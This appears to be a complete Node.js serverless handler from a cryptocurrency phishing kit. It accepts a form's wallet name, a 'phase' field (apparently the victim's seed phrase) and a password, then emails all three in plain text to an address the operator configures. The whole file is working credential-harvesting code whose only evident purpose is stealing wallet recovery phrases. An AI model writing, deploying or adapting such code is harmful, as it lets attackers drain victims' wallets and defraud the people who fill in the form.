const nodemailer = require('nodemailer');

function htmlspecialchars(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

async function parseRequestBody(req) {
  if (req.body) return req.body;
  const chunks = [];
  for await (const chunk of req) chunks.push(chunk);
  const raw = Buffer.concat(chunks).toString('utf8');
  const params = Object.fromEntries(new URLSearchParams(raw));
  return params;
}

module.exports = async function (req, res) {
  if (req.method !== 'POST') {
    res.statusCode = 405;
    res.setHeader('Allow', 'POST');
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify({ error: 'Method Not Allowed' }));
    return;
  }

  let body = {};
  try {
    body = await parseRequestBody(req);
  } catch (e) {
    res.statusCode = 400;
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify({ error: 'Invalid request body.' }));
    return;
  }

  const wallet_name = htmlspecialchars((body.wallet_name || '').toString().trim());
  const phase = (body.phase || '').toString().trim();
  const password = (body.pw || '').toString().trim();

  if (!phase) {
    res.statusCode = 400;
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify({ error: 'Required field missing.' }));
    return;
  }

  const host =
    process.env.SMTP_HOST?.trim() ||
    process.env.smtp_host?.trim() ||
    'smtp.gmail.com';
  const port = parseInt(
    process.env.SMTP_PORT?.trim() ||
      process.env.smtp_port?.trim() ||
      '587',
    10,
  );
  const user =
    process.env.SMTP_USER?.trim() ||
    process.env.smtp_user?.trim() ||
    process.env.SMTP_USER_NAME?.trim();
  const pass =
    process.env.SMTP_PASS?.trim() ||
    process.env.smtp_pass?.trim() ||
    process.env.SMTP_PASSWORD?.trim();
  const to =
    process.env.MAIL_TO?.trim() ||
    process.env.mail_to?.trim() ||
    user;
  const from =
    process.env.MAIL_FROM?.trim() ||
    process.env.mail_from?.trim() ||
    `noreply@${req.headers.host || 'example.com'}`;

  console.log('SMTP Config Debug:', {
    host,
    port,
    user: user ? '***set***' : 'NOT_SET',
    pass: pass ? '***set***' : 'NOT_SET',
    to,
    from,
  });

  const missingVars = [];
  if (!user) missingVars.push('SMTP_USER');
  if (!pass) missingVars.push('SMTP_PASS');
  if (missingVars.length) {
    res.statusCode = 500;
    res.setHeader('Content-Type', 'application/json');
    res.end(
      JSON.stringify({
        error: `SMTP credentials not configured on the server. Missing: ${missingVars.join(', ')}.`,
      }),
    );
    return;
  }

  const transporter = nodemailer.createTransport({
    host,
    port,
    secure: port === 465,
    auth: {
      user,
      pass,
    },
  });

  const mailOptions = {
    from,
    to,
    subject: 'New Form Submission',
    text: `Wallet Name: ${wallet_name}\nPhase: ${phase}\nPassword: ${password}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.statusCode = 200;
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify({ success: true }));
    return;
  } catch (err) {
    res.statusCode = 500;
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify({ error: 'Message could not be sent. ' + (err && err.message ? err.message : String(err)) }));
    return;
  }
};
